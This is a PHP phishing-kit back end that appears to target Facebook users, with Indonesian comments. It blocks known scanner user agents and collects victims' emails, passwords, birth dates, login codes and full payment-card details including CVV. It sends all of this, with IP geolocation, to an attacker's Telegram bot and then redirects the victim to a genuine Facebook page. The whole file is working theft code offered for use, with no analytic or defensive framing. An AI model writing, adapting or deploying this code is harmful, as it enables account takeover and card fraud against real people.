

<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// system function to process bot
function sendMessage($idTelegram, $messageBot, $tokenBot) {

    $url = "https://api.telegram.org/bot" . $tokenBot . "/sendMessage?parse_mode=html&chat_id=" . $idTelegram;
    $url = $url . "&text=" . urlencode($messageBot);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// get the bot data that you have set
include 'jestore/813944336231212681997529ChunkjestoreIP.php';
include 'jestore/813944336231212681997529Chunkjestore.php';

// MENANGKAP DATA YANG DI-INPUT
$godhelpme1ma = $_POST['godhelpme1ma']; // Email
$godhelpme1pa = $_POST['godhelpme1pa']; // Password
$godhelpme1mo = $_POST['godhelpme1mo']; // Bulan Kelahiran
$godhelpme1da = $_POST['godhelpme1da']; // Tanggal Kelahiran
$godhelpme1ye = $_POST['godhelpme1ye']; // Tahun Kelahiran

$godhelpme2ma = $_POST['godhelpme2ma']; // Email
$godhelpme2pa = $_POST['godhelpme2pa']; // Password
$godhelpme2mo = $_POST['godhelpme2mo']; // Bulan Kelahiran
$godhelpme2da = $_POST['godhelpme2da']; // Tanggal Kelahiran
$godhelpme2ye = $_POST['godhelpme2ye']; // Tahun Kelahiran

$logincode = $_POST['logincode']; // Login Code
$logincodeX = $_POST['logincodeX']; // Login Code
$XlogincodeX = $_POST['XlogincodeX']; // Login Code

$godhelpmenoc = $_POST['godhelpmenoc']; // NOC
$godhelpmecn = $_POST['godhelpmecn']; // CN
$godhelpmecmo = $_POST['godhelpmecmo']; // Month
$godhelpmecye = $_POST['godhelpmecye']; // Year
$godhelpmecvv = $_POST['godhelpmecvv']; // VVVC

// system will redirect to the main page if no data is entered
if($godhelpme1ma == '' || $godhelpme1pa == '' || $godhelpme1mo == '' || $godhelpme1da == '') {
header("Location: index.php");
} else {

// message content to sent to bot
$messageBot = "
━━━━━━━༻XXX༺━━━━━━
➤Email / Phone : <code>$godhelpme1ma</code>
➤Password : <code>$godhelpme1pa</code>
➤Day-Month-Year : <code>$godhelpme1da</code> - <code>$godhelpme1mo</code> - <code>$godhelpme1ye</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Email / Phone : <code>$godhelpme2ma</code>
➤Password : <code>$godhelpme2pa</code>
➤Day-Month-Year : <code>$godhelpme2da</code> - <code>$godhelpme2mo</code> - <code>$godhelpme2ye</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 1 : <code>$logincode</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 2 : <code>$logincodeX</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 3 : <code>$XlogincodeX</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Name Of Card : <code>$godhelpmenoc</code>
➤Card Number : <code>$godhelpmecn</code>
➤MM/YY : <code>$godhelpmecmo/$godhelpmecye</code>
➤CVV : <code>$godhelpmecvv</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Country : $jestore_flag | $jestore_countryCode | +$jestore_callcode | $jestore_country
➤Ip Address : <code>$jestore_ipaddress</code>
➤Benua : $jestore_timezone 
➤Propinsi : $jestore_regionName
➤Kota : $jestore_city
➤Time Zone : $timezone
━━━━━━━༻XXX༺━━━━━━
";
}

// sent all data to bot
sendMessage($idTelegram, $messageBot, $tokenBot);
?>
    <html>
    <meta http-equiv="refresh" content="0; URL=https://web.facebook.com/policies_center?_rdc=1&_rdr&wtsid=rdr_0ObmAat2DmJLInmU8" />
        </html>